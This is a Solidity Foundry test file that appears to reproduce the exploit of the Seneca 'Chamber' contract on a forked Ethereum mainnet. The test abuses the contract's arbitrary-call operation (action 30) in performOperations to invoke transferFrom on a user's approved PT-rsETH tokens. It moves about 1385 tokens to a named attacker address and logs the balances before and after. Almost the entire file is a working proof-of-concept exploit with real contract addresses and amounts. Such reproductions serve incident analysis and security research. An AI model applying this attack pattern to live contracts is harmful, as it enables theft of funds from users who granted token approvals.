// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {IChamber} from "./interfaces/IChamber.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract SenecaPoC is Test {
    IERC20 constant PTrsETH = IERC20(0xB05cABCd99cf9a73b19805edefC5f67CA5d1895E);
    IChamber constant CHAMBER = IChamber(0x65c210c59B43EB68112b7a4f75C8393C36491F06);

    function setUp() public {
        vm.createSelectFork("eth", 19325936);
        //vm.etch(address(MARKETS_IMPL), address(deployCode('MarketsView.sol')).code);
        vm.label(address(CHAMBER), "Chamber");
    }

    function testPoc() public {
        console.log("Attacker balance before exploit:", PTrsETH.balanceOf(0x94641c01a4937f2C8eF930580cF396142a2942DC)/1e18, "PT-rsETH");
        console.log("Users balance before exploit:", PTrsETH.balanceOf(0x9CBF099ff424979439dFBa03F00B5961784c06ce)/1e18, "PT-rsETH");
        // arguments to pass to performOperations
        // perform OPERATION_CALL = 30 for _call to be called
        uint8[] memory actions = new uint8[](1);
        actions[0] = 30;

        // unused value to send with the tx
        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        // create the datas array argument (arguments to provide to call)
        bytes[] memory datas = new bytes[](1);
        // specify that the chamber contract calls tranferFrom
        bytes memory callData;
        callData = abi.encodeWithSignature("transferFrom(address,address,uint256)", 0x9CBF099ff424979439dFBa03F00B5961784c06ce, 0x94641c01a4937f2C8eF930580cF396142a2942DC, 1385238431763437306795);
        address callee = address(PTrsETH);
        bool useValue1 = false;
        bool useValue2 = false;
        uint8 returnValues = 0;
        bytes memory data = abi.encode(callee, callData, useValue1, useValue2, returnValues);
        datas[0] = data;

        CHAMBER.performOperations(actions, values, datas);

        console.log("Attacker balance after exploit:", PTrsETH.balanceOf(0x94641c01a4937f2C8eF930580cF396142a2942DC)/1e18, "PT-rsETH");
        console.log("Users balance after exploit:", PTrsETH.balanceOf(0x9CBF099ff424979439dFBa03F00B5961784c06ce)/1e18, "PT-rsETH");
    }
}
